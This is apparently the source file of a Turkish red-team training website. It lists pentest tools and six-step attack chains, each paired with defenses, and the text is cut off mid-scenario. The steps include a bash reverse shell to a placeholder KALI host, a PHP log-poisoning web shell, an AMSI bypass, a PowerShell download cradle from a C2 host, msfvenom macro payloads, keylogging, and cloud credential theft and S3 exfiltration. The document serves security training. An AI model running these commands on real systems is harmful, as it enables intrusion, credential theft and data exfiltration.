"use client";
import Link from "next/link";
import { Shield, ArrowRight, ChevronDown, ChevronRight, Crosshair, GitBranch } from "lucide-react";
import { useState } from "react";
import { cn } from "@/lib/utils";

// ─── Araçlar (accordion kategorileri) ───────────────────────────────
const toolCategories = [
  {
    id: "bilgi-toplama",
    category: "Bilgi Toplama",
    emoji: "🔍",
    desc: "Pasif/aktif keşif — hedefi tanı, iz bırakma",
    items: [
      { slug: "osint-basics",                       title: "OSINT Temelleri",         desc: "WHOIS, DNS, crt.sh, Wayback — pasif keşif omurgası", level: "Başlangıç" },
      { slug: "osint-basics/shodan-ileri",           title: "Shodan İleri",            desc: "İnternete açık servis arama motoru — dork'lar, API, ICS/SCADA keşfi", level: "Orta" },
      { slug: "osint-basics/theharvester-maltego",  title: "theHarvester & Maltego",  desc: "E-posta/çalışan toplama, Recon-ng, Maltego ilişki grafiği", level: "Orta" },
      { slug: "google-dorking",                      title: "Google Dorking",          desc: "İleri seviye arama operatörleriyle hassas veri keşfi", level: "Orta" },
    ],
  },
  {
    id: "ag-kesfi",
    category: "Ağ Keşfi",
    emoji: "🗺️",
    desc: "Port tarama, servis enum, zafiyet tarama",
    items: [
      { slug: "nmap",       title: "Nmap",       desc: "Ping sweep'ten NSE script motoruna tam ağ tarama", level: "Başlangıç–İleri" },
      { slug: "enum4linux", title: "enum4linux", desc: "SMB/Samba enumeration — kullanıcı, paylaşım, parola politikası", level: "Başlangıç–Orta" },
      { slug: "nessus",     title: "Nessus",     desc: "Kurumsal zafiyet tarayıcı — CVE eşleştirme, doğrulama", level: "Başlangıç–Orta" },
    ],
  },
  {
    id: "web",
    category: "Web Uygulama Güvenliği",
    emoji: "🌐",
    desc: "Dizin keşfi, fuzzing, SQLi, Burp, CMS tarama",
    items: [
      { slug: "gobuster",         title: "Gobuster",               desc: "Dizin, dosya ve DNS alt alan keşfi", level: "Başlangıç" },
      { slug: "ffuf",             title: "ffuf",                   desc: "Hızlı web fuzzer — parametre, header ve yol testi", level: "Orta" },
      { slug: "sqlmap",           title: "SQLMap",                 desc: "SQL injection tespiti ve sömürüsü — WAF atlatmaya kadar", level: "Orta–İleri" },
      { slug: "burpsuite",        title: "Burp Suite",             desc: "Proxy, Repeater ve Intruder ile manuel web analizi", level: "Orta" },
      { slug: "nikto",            title: "Nikto",                  desc: "Web sunucu zafiyet ve yanlış yapılandırma tarayıcısı", level: "Başlangıç" },
      { slug: "wpscan",           title: "WPScan",                 desc: "WordPress eklenti, tema, kullanıcı zafiyet taraması", level: "Orta" },
      { slug: "web-exploitation", title: "Web Sömürü Teknikleri", desc: "LFI/RFI, dosya yükleme bypass, log poisoning, command injection", level: "Orta–İleri" },
    ],
  },
  {
    id: "shell-erisim",
    category: "Shell & Erişim",
    emoji: "💻",
    desc: "Reverse shell, TTY upgrade, dosya transferi",
    items: [
      { slug: "reverse-shells", title: "Reverse Shell & TTY", desc: "Bash/Python/PHP/PowerShell reverse shell + tam etkileşimli TTY", level: "Başlangıç–Orta" },
      { slug: "file-transfer",  title: "Dosya Transferi",     desc: "HTTP, certutil, SMB, scp ile hedefe/hedeften dosya aktarma", level: "Başlangıç–Orta" },
    ],
  },
  {
    id: "parola",
    category: "Parola Saldırıları",
    emoji: "🔑",
    desc: "Online brute force, offline hash kırma",
    items: [
      { slug: "hydra",   title: "Hydra",            desc: "Online brute force — SSH, FTP, HTTP, SMB form saldırıları", level: "Orta" },
      { slug: "john",    title: "John the Ripper",  desc: "Offline hash kırma, /etc/shadow ve özel format desteği", level: "Orta" },
      { slug: "hashcat", title: "Hashcat",          desc: "GPU hızlandırmalı hash kırma — NTLM, Kerberoast, WPA", level: "Orta–İleri" },
    ],
  },
  {
    id: "exploitation",
    category: "Sömürü (Exploitation)",
    emoji: "💥",
    desc: "Public exploit, msfvenom, meterpreter",
    items: [
      { slug: "metasploit", title: "Metasploit Framework", desc: "Exploit, msfvenom payload üretimi ve meterpreter post-exploitation", level: "Orta–İleri" },
    ],
  },
  {
    id: "active-directory",
    category: "Active Directory & İç Ağ",
    emoji: "🏛️",
    desc: "AD saldırı zinciri — LLMNR'den Domain Admin'e",
    items: [
      { slug: "bloodhound", title: "BloodHound",            desc: "AD saldırı yollarını grafiksel haritalama — DA'ya en kısa yol", level: "İleri" },
      { slug: "responder",  title: "Responder",             desc: "LLMNR/NBT-NS zehirleme ile NetNTLMv2 hash yakalama", level: "İleri" },
      { slug: "netexec",    title: "NetExec (CME)",          desc: "İç ağ numaralandırma, Pass-the-Hash ve yanal hareket", level: "İleri" },
      { slug: "impacket",   title: "Impacket & Kerberos",   desc: "secretsdump, psexec, Kerberoasting, AS-REP Roasting", level: "İleri" },
    ],
  },
  {
    id: "post-exploit",
    category: "Post-Exploitation & PrivEsc",
    emoji: "⬆️",
    desc: "Root/SYSTEM'e yetki yükseltme, lateral, pivot",
    items: [
      { slug: "linux-privesc",   title: "Linux PrivEsc",        desc: "LinPEAS, SUID, Sudo, Cron — root'a her yol", level: "Orta–İleri" },
      { slug: "windows-privesc", title: "Windows PrivEsc",      desc: "WinPEAS, token impersonation, servis izinleri, unquoted path", level: "Orta–İleri" },
      { slug: "pivoting",        title: "Pivoting & Tunneling", desc: "SSH tünelleme, proxychains, chisel, ligolo ile iç ağa sıçrama", level: "İleri" },
    ],
  },
  {
    id: "ctf",
    category: "CTF Teknikleri",
    emoji: "🚩",
    desc: "Forensics, kripto, binary — CTF kategorileri",
    items: [
      { slug: "stego-forensics",     title: "Steganografi & Forensics", desc: "binwalk, steghide, exiftool, zsteg, PCAP analizi", level: "Başlangıç–Orta" },
      { slug: "crypto-ctf",          title: "Kriptografi & Encoding",   desc: "Base64/hex, XOR, klasik şifreler, RSA, CyberChef", level: "Başlangıç–İleri" },
      { slug: "binary-exploitation", title: "Binary Exploitation",      desc: "Ghidra, gdb, pwntools, buffer overflow, ret2win", level: "Orta–İleri" },
    ],
  },
  {
    id: "sunucu-saldiri",
    category: "Sunucu Saldırıları",
    emoji: "🖥️",
    desc: "Linux/Windows Server, web ve DB sömürüsü",
    items: [
      { slug: "linux-server",     title: "Linux Server",          desc: "SSH/NFS/Samba sömürüsü, foothold'dan root'a", level: "Başlangıç–İleri" },
      { slug: "windows-server",   title: "Windows Server",        desc: "RDP/WinRM/SMB, credential dump, Domain Admin yolu", level: "Orta–İleri" },
      { slug: "web-servers",      title: "Web Sunucuları",        desc: "Apache/Nginx/IIS — path traversal, yanlış yapılandırma", level: "Orta" },
      { slug: "database-servers", title: "Veritabanı Sunucuları", desc: "MySQL/MSSQL — xp_cmdshell, hash çıkarma, RCE", level: "Orta–İleri" },
    ],
  },
  {
    id: "diger",
    category: "Cloud & Kablosuz & Mobil",
    emoji: "☁️",
    desc: "AWS/Azure, Wi-Fi, Android/iOS pentest",
    items: [
      { slug: "cloud-pentest",  title: "Cloud Pentest",        desc: "S3 bucket, IAM enum, metadata SSRF, ScoutSuite, Pacu", level: "Orta–İleri" },
      { slug: "wifi-pentest",   title: "Wi-Fi Güvenlik Testi", desc: "Monitor mod, handshake yakalama, Evil Twin, Enterprise", level: "Orta–İleri" },
      { slug: "mobile-pentest", title: "Mobil Uygulama",       desc: "APK analizi, Burp araya girme, SSL Pinning bypass, Frida", level: "Orta–İleri" },
    ],
  },
];

// ─── Saldırı Senaryoları ─────────────────────────────────────────────
const scenarioCategories = [
  {
    id: "web-klasik",
    label: "Web Uygulama",
    emoji: "🌐",
    scenarios: [
      {
        id: "nmap-smb",
        title: "Recon → SQLi Keşfi → DB Dump → OS Shell",
        difficulty: "Orta",
        diffColor: "amber",
        target: "Web Uygulaması + MSSQL/MySQL Sunucu",
        desc: "SQL injection'dan tablo dump'a, oradan OS komut yürütmeye — OWASP A03 saldırı omurgası.",
        chain: [
          { step: "1", label: "Parametre Fuzzing",   tool: "ffuf + Burp",       href: "/red-team/ffuf",             detail: "ffuf -u 'http://IP/page.php?id=FUZZ' -w sql-payloads.txt → hata mesajı veya yanıt boyutu farkı" },
          { step: "2", label: "SQLi Doğrulama",      tool: "Burp Repeater",     href: "/red-team/burpsuite",        detail: "' OR '1'='1-- → giriş başarılı | ' AND 1=2-- → farklı yanıt → Boolean-based blind onayı" },
          { step: "3", label: "Otomatik Sömürü",     tool: "SQLMap",            href: "/red-team/sqlmap",           detail: "sqlmap -u 'http://IP/page.php?id=1' --dbs → DB listesi → --dump -D db -T users → hash'ler" },
          { step: "4", label: "Hash Kırma",          tool: "Hashcat / John",    href: "/red-team/hashcat",          detail: "hashcat -m 0 (MD5) veya -m 3200 (bcrypt) → düz parola → /admin paneline giriş" },
          { step: "5", label: "OS Shell",            tool: "SQLMap --os-shell", href: "/red-team/sqlmap",           detail: "MSSQL: sqlmap --os-shell → xp_cmdshell etkin → whoami: nt authority\\system" },
          { step: "6", label: "PrivEsc",             tool: "WinPEAS",           href: "/red-team/windows-privesc",  detail: "Servis SYSTEM değilse winpeas → SeImpersonate → PrintSpoofer → SYSTEM shell" },
        ],
        defense: "Prepared statement kullan (SQLi'nin tek kesin çözümü). xp_cmdshell kapalı tut. DB hesabına minimum yetki. WAF + hata mesajlarını kullanıcıya gösterme.",
      },
      {
        id: "web-lfi-rce",
        title: "Recon → LFI → Log Poisoning → RCE → Root",
        difficulty: "Orta",
        diffColor: "amber",
        target: "Linux Web Sunucu (Apache + PHP)",
        desc: "Dizin keşfinden Local File Inclusion'a, log dosyası zehirleme yoluyla uzaktan kod yürütmeye — CTF'lerin vazgeçilmezi.",
        chain: [
          { step: "1", label: "Keşif & Teknoloji",  tool: "Nikto + Nmap",        href: "/red-team/nikto",            detail: "nmap -sV -p 80,443 IP + nikto -h IP → PHP sürümü, dizin listeleme, hata sayfaları" },
          { step: "2", label: "Dizin & Parametre",  tool: "Gobuster / ffuf",      href: "/red-team/gobuster",         detail: "gobuster dir -u http://IP -w common.txt → /?page= parametresi, /backup, /admin" },
          { step: "3", label: "LFI Tespiti",        tool: "Burp Suite + Manuel",  href: "/red-team/burpsuite",        detail: "?page=../../../../etc/passwd → LFI onayı. php://filter/convert.base64-encode/resource=index.php → kaynak kodu" },
          { step: "4", label: "Log Poisoning",      tool: "Web Exploitation",     href: "/red-team/web-exploitation", detail: "User-Agent: <?php system($_GET['cmd']); ?> → LFI ile /var/log/apache2/access.log yükle → RCE" },
          { step: "5", label: "Reverse Shell",      tool: "Reverse Shells",       href: "/red-team/reverse-shells",   detail: "?cmd=bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1' → nc -lvnp 4444 → www-data shell" },
          { step: "6", label: "Linux PrivEsc",      tool: "LinPEAS",              href: "/red-team/linux-privesc",    detail: "linpeas.sh → sudo -l → GTFOBins (vim/find/python) veya SUID binary → root" },
        ],
        defense: "Dosya yoluna kullanıcı girdisi dahil etme. PHP: allow_url_include=Off. Web sunucusunu en az yetki ile çalıştır. ModSecurity LFI imzaları. Log dosyalarına dışarıdan yazma engellensin.",
      },
    ],
  },
  {
    id: "web-ileri",
    label: "Gelişmiş Web Saldırıları",
    emoji: "🕷️",
    scenarios: [
      {
        id: "ssrf-metadata",
        title: "SSRF Discovery → Internal Port Scan → AWS Metadata → IAM Credential Theft",
        difficulty: "İleri",
        diffColor: "red",
        target: "Cloud-hosted Web App (AWS EC2)",
        desc: "Uygulama üzerindeki SSRF zafiyeti, sunucunun bulut meta-data servisine (169.254.169.254) erişmesini sağlayarak IAM rolüne bağlı geçici AWS credential'larını çalar — içeriden dışarıya bulut ele geçirme.",
        chain: [
          { step: "1", label: "SSRF Parametre Tespiti", tool: "Burp Suite + ffuf",    href: "/red-team/burpsuite",        detail: "Burp Collaborator veya interactsh ile url= / path= / dest= parametrelerini test et → out-of-band DNS hit" },
          { step: "2", label: "Internal Port Scan",     tool: "Web Exploitation",     href: "/red-team/web-exploitation", detail: "SSRF ile http://127.0.0.1:FUZZ → ffuf ile tüm portları tara → Redis (6379), Elasticsearch (9200), iç API'ler" },
          { step: "3", label: "Metadata Endpoint",      tool: "Cloud Pentest",        href: "/red-team/cloud-pentest",    detail: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ → IAM role adını öğren" },
          { step: "4", label: "Credential Exfiltration",tool: "Cloud Pentest",        href: "/red-team/cloud-pentest",    detail: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE → AccessKeyId + SecretAccessKey + Token" },
          { step: "5", label: "AWS Enum & PrivEsc",     tool: "Cloud Pentest",        href: "/red-team/cloud-pentest",    detail: "aws sts get-caller-identity → aws iam list-attached-user-policies → Pacu ile iam:AttachUserPolicy → AdministratorAccess" },
          { step: "6", label: "Lateral → Data Exfil",  tool: "Cloud Pentest",        href: "/red-team/cloud-pentest",    detail: "aws s3 ls → aws s3 sync s3://bucket /tmp/loot | aws rds describe-db-instances → snapshot export" },
        ],
        defense: "IMDSv2'ye geçiş yap (token tabanlı — SSRF ile direkt erişim kırılır). SSRF'e karşı URL allowlist kullan. IAM rolüne en az yetki (least privilege). VPC endpoint + metadata'ya erişim kısıtla.",
      },
      {
        id: "api-jwt-idor",
        title: "API Recon → JWT Algorithm Confusion → IDOR → Admin Takeover",
        difficulty: "İleri",
        diffColor: "red",
        target: "REST API Backend (Node.js / Python)",
        desc: "API keşfinden JWT algoritma karışıklığı saldırısına (alg:none / RS256→HS256) geçerek imzasız token oluşturulur, IDOR ile admin endpoint'leri ele geçirilir — modern web'in en kritik kombinasyonu.",
        chain: [
          { step: "1", label: "API Endpoint Keşfi",    tool: "ffuf + Gobuster",     href: "/red-team/gobuster",         detail: "ffuf -u http://API/FUZZ -w api-wordlist.txt → /api/v1/users, /api/admin, /api/v2/internal" },
          { step: "2", label: "JWT Analizi",           tool: "Burp Suite",          href: "/red-team/burpsuite",        detail: "Authorization: Bearer <token> → jwt.io'da decode et → alg: RS256, sub: user_id: 42" },
          { step: "3", label: "Algorithm Confusion",   tool: "Web Exploitation",    href: "/red-team/web-exploitation", detail: "alg: 'none' dene → imzasız token kabul edilirse admin. RS256→HS256: public key ile HMAC imzala → sunucu kabul eder" },
          { step: "4", label: "Privilege Escalation",  tool: "Burp Repeater",       href: "/red-team/burpsuite",        detail: "Token payload'ında role:'user' → role:'admin', user_id:42 → user_id:1 → /api/admin endpoint'lerine eriş" },
          { step: "5", label: "IDOR → Mass Data",      tool: "Burp Intruder",       href: "/red-team/burpsuite",        detail: "GET /api/v1/users/FUZZ → Intruder ile 1'den 9999'e user ID brute → tüm kullanıcı PII sızdır" },
          { step: "6", label: "Account Takeover",      tool: "Web Exploitation",    href: "/red-team/web-exploitation", detail: "PATCH /api/v1/users/1/password → admin parolasını değiştir → admin paneline tam erişim" },
        ],
        defense: "JWT imzalamayı asymmetric key ile yap, algoritma client'tan gelmesin (sunucu tarafında sabit). IDOR'a karşı her obje erişiminde server-side ownership kontrolü. Rate limiting ve anomali tespiti.",
      },
    ],
  },
  {
    id: "ad-ileri",
    label: "Active Directory & İç Ağ",
    emoji: "🏛️",
    scenarios: [
      {
        id: "ntlm-relay",
        title: "SMB Signing Check → NTLM Relay → SAM Dump → Pass-the-Hash → DA",
        difficulty: "İleri",
        diffColor: "red",
        target: "Active Directory (SMB Signing Disabled)",
        desc: "SMB imzalamanın devre dışı olduğu ağda, NTLM kimlik doğrulaması başka bir hedefe yönlendirilerek (relay) credential'sız local admin elde edilir ve Pass-the-Hash ile Domain Admin'e ulaşılır.",
        chain: [
          { step: "1", label: "SMB Signing Kontrolü", tool: "Nmap / NetExec",       href: "/red-team/netexec",    detail: "netexec smb 192.168.1.0/24 --gen-relay-list targets.txt → signing:False olan tüm makineler listelenir" },
          { step: "2", label: "Relay Kurulumu",       tool: "Responder",             href: "/red-team/responder",  detail: "responder.conf: SMB=Off, HTTP=Off → python Responder.py -I eth0 -dPv (relay için SMB kapalı olmalı!)" },
          { step: "3", label: "NTLM Relay",           tool: "impacket ntlmrelayx",   href: "/red-team/impacket",   detail: "ntlmrelayx.py -tf targets.txt -smb2support → kurban kimlik doğrulaması gelince hedefe ilet → SAM dump" },
          { step: "4", label: "Local Hash Dump",      tool: "impacket secretsdump",  href: "/red-team/impacket",   detail: "SAM: Administrator:500:aad3...:8a4b... → tüm local hesap NTLM hash'leri elde edildi" },
          { step: "5", label: "Pass-the-Hash Spray",  tool: "NetExec",               href: "/red-team/netexec",    detail: "netexec smb 192.168.1.0/24 -u Administrator -H 8a4b... --local-auth → Pwn3d! olan makineler" },
          { step: "6", label: "DCSync → DA",          tool: "impacket secretsdump",  href: "/red-team/impacket",   detail: "Ele geçirilen makinede DA oturumu varsa (BloodHound HasSession) → secretsdump → krbtgt hash → DA" },
        ],
        defense: "Tüm ağda SMB imzalamayı zorunlu kıl (GPO: 'Microsoft network server: Digitally sign communications always'). LAPS ile local admin parolalarını farklılaştır. Event ID 4624 (Logon Type 3) anomalilerini izle.",
      },
      {
        id: "unconstrained-delegation",
        title: "BloodHound → Unconstrained Delegation → Printer Bug → TGT Capture → DA",
        difficulty: "İleri",
        diffColor: "red",
        target: "Active Directory (Kısıtsız Delegasyon yapılandırılmış sunucu)",
        desc: "Kısıtsız delegasyon yetkisi olan sunucuyu BloodHound ile tespit edip, Printer Bug (SpoolSample) ile DC'yi o sunucuya kimlik doğrulamaya zorlayarak DC'nin TGT'sini çalar ve Domain Admin yetkisi kazanırsın.",
        chain: [
          { step: "1", label: "AD Haritalama",         tool: "BloodHound",             href: "/red-team/bloodhound",  detail: "bloodhound-python -c All → 'Unconstrained Delegation' düğümlerini bul → SRV01 işaretli" },
          { step: "2", label: "SRV01'e Giriş",         tool: "NetExec / evil-winrm",   href: "/red-team/netexec",     detail: "Ele geçirilmiş hesapla SRV01'e WinRM veya PsExec ile gir → TGT monitoring başlat (Rubeus monitor)" },
          { step: "3", label: "TGT İzleme",            tool: "impacket",               href: "/red-team/impacket",    detail: "Rubeus.exe monitor /interval:5 /nowrap → gelen TGT'leri base64 olarak yakala, hazır bekle" },
          { step: "4", label: "Printer Bug (SpoolSample)", tool: "impacket",           href: "/red-team/impacket",    detail: "printerbug.py domain/user:pass@DC01 SRV01 → DC01'i SRV01'e SMB kimlik doğrulaması yapmaya zorla" },
          { step: "5", label: "DC TGT Yakalama",       tool: "impacket",               href: "/red-team/impacket",    detail: "Rubeus monitor çıktısında DC01$ hesabının TGT'si gelir → Rubeus ptt /ticket:BASE64 → ticket inject" },
          { step: "6", label: "DCSync → DA",           tool: "impacket secretsdump",   href: "/red-team/impacket",    detail: "DC01$ TGT ile secretsdump.py -k -no-pass DC01 → tüm hash'ler → Administrator NTLM → DA" },
        ],
        defense: "Kısıtsız delegasyonu kaldır, gerekiyorsa Constrained veya Resource-Based Constrained Delegation kullan. MS-RPRN (Spooler servisi) kapalı tut. Protected Users grubunu kullan — TGT delegasyona izin vermez.",
      },
    ],
  },
  {
    id: "initial-access",
    label: "Initial Access & Sosyal Mühendislik",
    emoji: "🎣",
    scenarios: [
      {
        id: "phishing-macro-c2",
        title: "OSINT → Spear Phishing → Malicious Macro → AMSI Bypass → C2 Beacon",
        difficulty: "İleri",
        diffColor: "red",
        target: "Windows İş İstasyonu (Kurumsal ağ)",
        desc: "Kurban profili çıkarılan hedef kişiye gönderilen spear phishing e-postasındaki zararlı Office makrosu, AMSI'yi atlayarak bellekte çalışır ve C2 bağlantısı kurar — Red Team'in en sık kullandığı initial access vektörü.",
        chain: [
          { step: "1", label: "OSINT & Profil",       tool: "OSINT Temelleri",      href: "/red-team/osint-basics",     detail: "LinkedIn → departman/unvan/araçlar | theHarvester → kurumsal e-posta formatı | Shodan → mail gateway" },
          { step: "2", label: "Spear Phishing",       tool: "theHarvester & Maltego",href: "/red-team/osint-basics/theharvester-maltego", detail: "Hedefin yöneticisini taklit eden domain (homoglyph/typosquatting) + kişiselleştirilmiş içerik ile mail gönder" },
          { step: "3", label: "Macro Hazırlama",      tool: "Metasploit",           href: "/red-team/metasploit",       detail: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... -f vba → Office makrosu içine göm, AutoOpen" },
          { step: "4", label: "AMSI Bypass",          tool: "Web Exploitation",     href: "/red-team/web-exploitation", detail: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',...).SetValue($null,$true)" },
          { step: "5", label: "C2 Beacon",            tool: "Reverse Shells",       href: "/red-team/reverse-shells",   detail: "PowerShell cradle: IEX(New-Object Net.WebClient).DownloadString('http://C2/stager') → meterpreter oturumu" },
          { step: "6", label: "Persistence + Pivot",  tool: "NetExec",              href: "/red-team/netexec",          detail: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run → iç ağda netexec ile yatay hareket" },
        ],
        defense: "Makroları varsayılan kapalı tut (GPO: 'Disable all macros without notification'). Anti-phishing eğitimi + DMARC/DKIM. EDR ile PowerShell script block logging (Event 4104). Outbound HTTPS trafiğini proxy üzerinden geçir.",
      },
      {
        id: "drive-by-meterpreter",
        title: "Recon → Drive-by Download → Browser Exploit → Meterpreter → Keylogger",
        difficulty: "Orta",
        diffColor: "amber",
        target: "Windows İş İstasyonu (Güncel olmayan tarayıcı/eklenti)",
        desc: "Kurbanın ziyaret ettiği bir web sayfasına yerleştirilen kötü amaçlı içerik, güncel olmayan tarayıcı eklentisini (Java/Flash/PDF) sömürerek kullanıcı etkileşimi olmadan Meterpreter oturumu başlatır.",
        chain: [
          { step: "1", label: "Hedef Profil",         tool: "OSINT Temelleri",    href: "/red-team/osint-basics",    detail: "Hedefin hangi siteleri ziyaret ettiğini öğren (çalıştığı şirketin partner portalı, sektör forumu vb.)" },
          { step: "2", label: "Watering Hole Hazırlık",tool: "Metasploit",        href: "/red-team/metasploit",      detail: "msfvenom -p windows/meterpreter/reverse_tcp -f exe → web sunucuya koy, JS yönlendirmesi ekle" },
          { step: "3", label: "Browser Exploit",      tool: "Metasploit",         href: "/red-team/metasploit",      detail: "use exploit/multi/browser/java_signed_applet → SRVHOST set → hedef siteyi ziyaret edince otomatik tetikle" },
          { step: "4", label: "Meterpreter Oturumu",  tool: "Metasploit",         href: "/red-team/metasploit",      detail: "sessions -i 1 → sysinfo → getuid → migrate explorer.exe (kararlılık için süreç göçü)" },
          { step: "5", label: "Keylogger + Harvest",  tool: "Metasploit",         href: "/red-team/metasploit",      detail: "keyscan_start → 5 dk bekle → keyscan_dump → kurumsal VPN/e-posta credential'ları" },
          { step: "6", label: "Persistence",          tool: "Windows PrivEsc",    href: "/red-team/windows-privesc", detail: "run post/windows/manage/persistence_exe → HKLM run key veya scheduled task → reboot sonrası da bağlı" },
        ],
        defense: "Tarayıcıyı ve tüm eklentileri güncel tut. Java/Flash tamamen kaldır. Web filtreleme (kategorize edilmemiş / şüpheli domain'ler engelle). EDR davranışsal analizi. Uygulama whitelist (AppLocker/WDAC).",
      },
    ],
  },
  {
    id: "cloud-privesc",
    label: "Cloud Sızma Testi",
    emoji: "☁️",
    scenarios: [
      {
        id: "s3-hardcoded-iam",
        title: "S3 Bucket Recon → Source Code Leak → Hardcoded Keys → IAM PrivEsc → Admin",
        difficulty: "Orta",
        diffColor: "amber",
        target: "AWS Ortamı (Misconfigured S3 + IAM)",
        desc: "Herkese açık S3 kovası içindeki kaynak kod veya yapılandırma dosyasında bulunan hardcoded AWS anahtarları, IAM politika ekleme zafiyetiyle Administrator erişimine yükseltilir — bulut pentestinin en yaygın bulgusu.",
        chain: [
          { step: "1", label: "S3 Bucket Keşfi",      tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "Google dork: site:s3.amazonaws.com ŞIRKET | grayhatwarfare.com | aws s3 ls s3://şirket-backup --no-sign-request" },
          { step: "2", label: "Public Bucket Okuma",  tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "aws s3 sync s3://hedef-bucket /tmp/loot --no-sign-request → config/, .env, application.properties indir" },
          { step: "3", label: "Credential Analizi",   tool: "Google Dorking",      href: "/red-team/google-dorking",  detail: "grep -rn 'AKIA' /tmp/loot → AWS Access Key (AKIA ile başlar) + Secret Key → trufflehog ile tarama" },
          { step: "4", label: "IAM Enum",             tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "aws sts get-caller-identity → aws iam list-attached-user-policies → aws iam simulate-principal-policy" },
          { step: "5", label: "IAM PrivEsc",          tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "iam:AttachUserPolicy hakkı varsa → aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess" },
          { step: "6", label: "Full AWS Erişimi",     tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "Admin → tüm S3 bucket'lar, RDS snapshot, EC2 → Lambda içinde credential taraması → cross-account pivot" },
        ],
        defense: "Tüm S3 bucket'larda public access block aktif et. Kodda hardcoded credential yasak (pre-commit hook: detect-secrets). IAM rollerine minimum yetki. AWS Config ile bucket policy değişikliklerini izle. CloudTrail aktif.",
      },
      {
        id: "ecr-supply-chain",
        title: "ECR Public Image → Secrets in Layer → ECS Task Role → S3 Exfil",
        difficulty: "İleri",
        diffColor: "red",
        target: "AWS Konteyner Ortamı (ECR + ECS + IAM)",
        desc: "Herkese açık container image katmanlarında gömülü kalan sertifika veya API anahtarı, ECS task üzerindeki aşırı yetkili IAM rolüyle birleşince tüm S3 ve RDS'e erişim imkânı doğurur — supply chain ve cloud privilege escalation kombinasyonu.",
        chain: [
          { step: "1", label: "ECR Image Keşfi",      tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "docker pull public.ecr.aws/şirket/app:latest → docker history → hangi katmanlarda ne var?" },
          { step: "2", label: "Image Layer Analizi",  tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "dive image:tag veya docker save | tar x → her katmanı aç, .env / id_rsa / .aws/credentials ara" },
          { step: "3", label: "Credential Çıkarma",  tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "Katmanda COPY .env → eski API key veya DB parolası. git log layer içindeyse geçmiş commit'lerde credential kalabilir" },
          { step: "4", label: "ECS Metadata Enum",   tool: "Web Exploitation",    href: "/red-team/web-exploitation", detail: "Konteyner içindeyken: curl http://169.254.170.2/v2/credentials/ → ECS Task Role'ün geçici token'ları" },
          { step: "5", label: "IAM Role Abuse",      tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "Çalınan token ile: aws s3 ls → aws rds describe-db-instances → aws secretsmanager list-secrets" },
          { step: "6", label: "Data Exfiltration",   tool: "Cloud Pentest",       href: "/red-team/cloud-pentest",   detail: "aws s3 sync s3://production-data /tmp/exfil → Secrets Manager'dan DB parolası al → RDS'e doğrudan bağlan" },
        ],
        defense: "Docker build'de multi-stage kullan (son image'da secret kalmasın). .dockerignore ile .env dosyalarını dışla. ECR image scanning aktif et. ECS Task Role'ü minimum yetki ile oluştur. Secrets Manager / Parameter Store kullan, asla ENV ile.",
      },
    ],
  },
  {
    id: "privesc",
    label: "Privilege Escalation",
    emoji: "⬆️",
    scenarios: [
      {
        id: "linux-sudo-suid",
        title: "Foothold → sudo -l → GTFOBins → Root → /etc/shadow Dump",
        difficulty: "Orta",
        diffColor: "amber",
        target: "Linux Sunucu (Yanlış yapılandırılmış sudo/SUID)",
        desc: "Düşük yetkili shell'den sudo yanlış yapılandırması veya SUID binary üzerinden root'a yükseltme ve /etc/shadow dump ile tüm sistem parolalarını elde etme — Linux CTF'lerinin ve gerçek iç ağların en sık bulgusu.",
        chain: [
          { step: "1", label: "Foothold",             tool: "Reverse Shells",     href: "/red-team/reverse-shells",   detail: "Herhangi bir saldırı vektöründen www-data veya düşük yetkili kullanıcı shell'i → python3 -c pty spawn" },
          { step: "2", label: "Sistem Enum",          tool: "LinPEAS",            href: "/red-team/linux-privesc",    detail: "curl -sL https://linpeas.sh | sh → sarı/kırmızı bulgular: sudo -l, SUID, yazılabilir /etc/cron.d" },
          { step: "3", label: "sudo -l Analizi",      tool: "Linux PrivEsc",      href: "/red-team/linux-privesc",    detail: "sudo -l → (ALL) NOPASSWD: /usr/bin/vim → gtfobins.github.io/gtfobins/vim/ → sudo vim -c ':!/bin/bash'" },
          { step: "4", label: "SUID Bypass (Alternatif)", tool: "Linux PrivEsc", href: "/red-team/linux-privesc",    detail: "find / -perm -4000 2>/dev/null → /usr/bin/find SUID ise: find . -exec /bin/sh -p \\; → root shell" },
          { step: "5", label: "Root Shell",           tool: "Linux PrivEsc",      href: "/red-team/linux-privesc",    detail: "id → uid=0(root) → cat /root/root.txt → /etc/shadow okunabilir → tüm kullanıcı hash'leri" },
          { step: "6", label: "Credential Dump",      tool: "Hashcat / John",     href: "/red-team/hashcat",          detail: "cat /etc/shadow → john shadow.txt --wordlist=rockyou.txt → kırılan parolalar ile pivot" },
        ],
        defense: "sudo'da sadece gerekli komutlara izin ver, asla ALL:ALL. SUID bitlerini düzenli denetle (find / -perm -4000). Cron script'lerinin sahibini ve yazma iznini kontrol et. AppArmor / SELinux ile süreci sınırla.",
      },
      {
        id: "windows-token-impersonation",
        title: "Low Priv Shell → whoami /priv → SeImpersonate → PrintSpoofer → SYSTEM → Mimikatz",
        difficulty: "İleri",
        diffColor: "red",
        target: "Windows Sunucu / IIS / MSSQL Servisi",
        desc: "IIS veya MSSQL servisi üzerinden alınan düşük yetkili shell'de SeImpersonatePrivilege hakkını tespit edip PrintSpoofer veya GodPotato ile SYSTEM'e yükselme ve Mimikatz ile bellekteki credential dump — Windows PrivEsc'in en bilinen exploit zinciri.",
        chain: [
          { step: "1", label: "Servis Shell",          tool: "Web Exploitation",   href: "/red-team/web-exploitation", detail: "IIS RCE / webshell upload / SQLi --os-shell → iis apppool\\defaultapppool veya nt service\\mssqlserver" },
